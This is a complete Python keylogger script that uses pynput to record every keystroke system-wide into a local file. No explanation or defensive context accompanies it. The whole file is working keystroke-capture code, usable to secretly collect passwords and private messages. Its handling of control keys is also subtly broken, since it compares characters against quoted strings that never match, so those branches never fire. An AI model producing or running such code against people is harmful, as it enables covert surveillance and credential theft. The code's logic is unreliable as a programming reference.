import os
import sys
import platform
import logging
from pynput.keyboard import Listener

# Set the log file path
LOG_FILE = "keylog.txt"

def on_key_press(key):
    try:
        # Convert key to string
        key_str = str(key.char)
        if key_str == "'\\x03'":  # Handle Ctrl+C (exit)
            sys.exit()
        elif key_str == "'\\x08'":  # Handle Backspace
            key_str = "[BACKSPACE]"
        elif key_str == "'\\x13'":  # Handle Ctrl+S (save)
            save_log()
            return
        elif key_str == "'\\x20'":  # Handle Space
            key_str = " "
        elif key_str == "'\\x0d'":  # Handle Enter
            key_str = "\n"
        elif key_str == "'\\x09'":  # Handle Tab
            key_str = "[TAB]"
        elif key_str == "'\\x11'":  # Handle Ctrl+Q (quit)
            sys.exit()
        elif key_str == "'\\x1b'":  # Handle Escape
            key_str = "[ESC]"

        # Append key to the log file
        with open(LOG_FILE, "a") as f:
            f.write(key_str)

    except AttributeError:
        # Handle special keys (e.g., Shift, Alt, etc.)
        if str(key) == "Key.space":
            key_str = " "
        else:
            key_str = f"[{str(key)}]"

        # Append special key to the log file
        with open(LOG_FILE, "a") as f:
            f.write(key_str)

def save_log():
    # Save the log file
    if os.path.exists(LOG_FILE):
        print(f"Keystrokes saved to {LOG_FILE}")
    else:
        print("No keystrokes recorded.")

def main():
    # Create a log file or clear existing content
    with open(LOG_FILE, "w") as f:
        f.write("")

    # Set up the key listener
    with Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
